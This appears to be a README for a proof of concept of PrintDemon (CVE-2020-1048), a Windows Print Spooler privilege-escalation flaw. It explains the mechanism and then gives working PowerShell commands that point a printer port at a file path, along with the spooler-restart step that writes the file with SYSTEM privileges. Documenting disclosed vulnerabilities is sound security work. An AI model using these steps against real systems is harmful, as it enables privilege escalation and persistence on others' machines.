# PrintDemon (CVE-2020-1048)

PrintDemon is a vulnerability that uses the Windows Printer Spooler to escalate privileges, bypass Endpoint Detection & Response (EDR), and gain persistence. The Windows Printer Spooler has a long history of vulnerabilities including a vulnerability (CVE-2010-2729) used by the well-known Malware called Stuxnet back in 2010.

A printer must be associated with two attributes: A printer port and a printer driver. The printer port can be set to 'PORTPROMPT' which makes it possible to print to a file.

The printer driver and printer port can be set as a low-privileged user when using certain PowerShell commands. When you print to the printer it will use the printer port which is set to a file. The print itself does not work, but the trick is that if you restart the spooler service, it impersonates SYSTEM. Since SYSTEM is a high-privileges account, you can drop a file anywhere on the system with a low-privileged user, hence the name privilege-escalation.

There was one problem though. When you print a string to the port, it looks like there is some markup at the beginning of the file. Since the first few bytes of a file is the signature of a file, it can not be untouched if you want to run it in a normal way.

# How-to

Run the following commands in PowerShell and use the tool or script to drop a file to the printer port location:

```
$printer = "PrintDemon"
$PrinterDriver = "Generic / Text Only"
$printerPort = "C:\Users\thalpius\Downloads\calc.exe"

Add-PrinterDriver -Name $PrinterDriver
Add-Printerport -name $printerPort
Add-Printer -Name $printer -DriverName $PrinterDriver -PortName $printerPort
```

**Note:** Once the print job is sent, restart the spooler service to drop the file with system privileges.
